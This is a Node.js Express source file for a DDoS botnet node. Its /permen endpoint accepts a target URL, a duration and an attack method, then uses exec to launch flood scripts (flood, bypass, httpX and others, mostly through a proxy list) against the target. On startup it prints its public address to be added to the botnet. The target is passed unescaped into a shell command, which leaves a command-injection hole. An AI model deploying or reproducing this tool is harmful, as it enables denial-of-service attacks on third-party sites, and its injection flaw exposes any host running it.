const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
return data
}

app.get('/permen', (req, res) => {
  const { target, time, methods } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname
res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

if (methods === 'hold') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/hold.js${target} ${time} 4 8`);
        } else if (methods === 'flood') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/flood.js ${target} ${time} 4 8 proxy.txt`)
        } else if (methods === 'bypass') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/BYPASS.js ${target} ${time} 8 4 proxy.txt`)
        } else if (methods === 'x') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/httpX.js ${target} ${time} 4 8 proxy.txt`)
        } else if (methods === 'lintar') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/lintar.js ${target} ${time} 4 8 proxy.txt`)
        } else if (methods === 'normal') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/normal.js ${target} ${time} 4 8 proxy.txt`)


} else {}
});
app.listen(port, () => {
fetchData()
});
